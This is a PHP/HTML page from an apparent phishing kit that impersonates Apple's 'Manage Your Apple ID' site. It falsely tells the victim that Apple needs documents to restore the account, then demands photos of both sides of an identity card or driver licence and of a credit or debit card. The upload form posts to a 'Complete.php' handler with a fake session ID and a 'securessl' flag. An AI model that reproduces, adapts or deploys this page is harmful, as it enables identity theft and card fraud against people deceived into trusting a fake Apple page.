<?php
require "assets/includes/session_protect.php";
require "assets/includes/functions.php";
require "assets/includes/language.mob.php";
require "assets/includes/One_Time.php";
require "assets/includes/enc.php";
?>
<!DOCTYPE html>
<html>
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
<title>Manage Your Apple ID - Apple</title>
<link href="assets/img/favicon.ico" rel="shortcut icon" type="image/x-icon">
<link href="assets/css/First.css" media="all" rel="stylesheet" type="text/css">
<link href="assets/css/Second.css" rel="stylesheet" type="text/css">
<link href="assets/css/Fonts.css" rel="stylesheet" type="text/css">
<link href="assets/css/verify.css" rel="stylesheet" type="text/css">
<script type="text/javascript">
if(screen.width <= 699) {
    var col = "col-sm-5";
    var btn = '<input type="submit" class="gobtn btn-link" style="width:50%;margin-left:auto;margin-right:auto;float:right" value="Finish">';
} else {
    var col = "col-sm-6 col-sm-offset-3";
    var btn = '<input type="submit" class="gobtn btn-link" style="float:right;" value="Finish">';
}
</script>
<style>.error {color:red}</style>
</head>
<body id="pagecontent">
<div id="content">
<div class="bdd45">
<nav id="xdsfv54" class="js no-touch svg no-ie7 no-ie8">
<div class="HeaderObjHolder">
<ul class="MobHeader">
<li class="HeaderObj MobMenIconH">
<label class="MobMenHol"> 
<span class="MobMenIcon MobMenIcon-top">
<span class="MobMenIcon-crust MobMenIcon-crust-top"></span> </span> <span class="MobMenIcon MobMenIcon-bottom">
<span class="MobMenIcon-crust MobMenIcon-crust-bottom"></span> </span>
</label>
</li>
<li class="HeaderObj">
<a class="Item1" href="#" style="display: inline-block;margin-left:50%;margin-top:11px" id="ac-gn-firstfocus-small"> <span class="ac-gn-link-text">&nbsp;</span> </a>
<a class="Item10" style="display: inline-block;float:right;margin-top:11px" href="#"> <span class="ac-gn-link-text">&nbsp;</span> <span class="ac-gn-bag-badge"></span> </a> <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span> 
</li>
</ul>
<ul class="HeaderObjList">
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item1" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item2" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item3" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item4" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item5" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item6" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item7" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item8" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item9" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item10" href="#"></a></li>
</ul>
</div>
</nav>



<div id="flow">
<div class="flow-body signin clearfix" role="main">
<div class="persona-splash no-photo clearfix">
    <div class="persona-bg"></div>
    <div class="container">
        <div class="splash-section">
            <div class=" person-wrapper">
                <div>
                    <div class="row">
                        <div class="col-sm-9 appleid-col">
                            <div class="flex-container">
                                <h1 class="mobile appleid-user">
                                    <span class="first_name">Account Information</span>
                                    <small class="SessionUser">Your Apple ID is <strong><?php echo $_SESSION['user'];?></strong> </small>
                                </h1>
                            </div>
                        </div>
                        <div class="not-mobile col-sm-3">
                            <div class="flex-container-signout">
                                <div class="signout pull-right">
                                    <button class="btn btn-link">Sign Out </button>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
<div class="container">
<div class="flex home-content">


<form action="Complete.php?&sessionid=<?php echo generateRandomString(115); ?>&securessl=true" method="post" name="details" id="details" class="proceed" enctype="multipart/form-data">
<input type="hidden" name="upload" value="1">
<div class="container flow-sections">
<div class="editable account-edit clearfix">
<div class="row edit-row">
<div id="cols">     
<h3 class="section-subtitle" id="nameLabel">Document and Credit Card</h3>
<p>Apple requires a copy of certain documents for verification purposes to return your account to regular standing.</p>
<div class="form-group">
<div class="form-group clearfix" style="padding-top:0px;">
<img src="assets/img/id.png" alt="Identity Card Example" title="Identity Card Example" style="width: 400px;">
</div>
<br>
<div class="pop-wrapper field-pop-wrapper middle-wrapper">
    <label for="upload"><b>* Take a photo of your Identity Card/Driver License (Front): </b></label>
<input type="file" name="file_id-front" id="upload" accept=".jpg, .jpeg, .png" required>
</div>
<br>
<div class="pop-wrapper field-pop-wrapper middle-wrapper">
    <label for="upload"><b>* Take a photo of your Identity Card/Driver License (Back): </b></label>
<input type="file" name="file_id-back" id="upload" accept=".jpg, .jpeg, .png" required>
</div>
<br>
<div class="pop-wrapper field-pop-wrapper middle-wrapper">
    <label for="upload"><b>* Take a photo of your Credit/Debit Card (Front): </b></label>
<input type="file" name="file_cc-front" id="upload" accept=".jpg, .jpeg, .png" required>
</div>
<br>
<div class="pop-wrapper field-pop-wrapper middle-wrapper">
    <label for="upload"><b>* Take a photo of your Credit/Debit Card (Back): </b></label>
<input type="file" name="file_cc-back" id="upload" accept=".jpg, .jpeg, .png" required>
</div>
<br>
<br>
<script type="text/javascript">
    document.write(btn);
</script>
</div>
</div>
</div>
</div>
</div>
</form>

<script type="text/javascript">
    $(document).ready(function() {
        $("#cols").addClass(col);
    });
</script>

</div>
</div>
</div>
</div>
</div>
</div>
</body>
</html>